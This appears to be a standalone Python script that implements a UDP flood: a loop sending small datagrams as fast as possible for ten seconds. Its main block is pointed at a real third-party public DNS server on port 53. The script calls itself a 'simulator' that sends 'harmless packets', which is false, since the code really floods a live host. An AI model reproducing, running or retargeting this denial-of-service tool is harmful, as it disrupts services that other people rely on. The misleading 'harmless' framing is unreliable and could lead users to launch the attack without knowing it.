import socket
import time
import sys

def udp_flood(target, port, duration=10, delay=0.0001):
    sock    = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * 64
    sent    = 0
    end     = time.time() + duration

    try:
        while time.time() < end:
            sock.sendto(payload, (target, port))
            sent += 1
            if delay > 0:
                time.sleep(delay)
    except KeyboardInterrupt:
        pass
    finally:
        sock.close()

    print(f"Sent {sent} packets.")

if __name__ == "__main__":
    print("UDP flood simulator — sends harmless packets to 8.8.8.8:53")
    print("Press Enter to start or Ctrl+C to exit.")
    try:
        input()
        udp_flood("8.8.8.8", 53)
    except KeyboardInterrupt:
        sys.exit()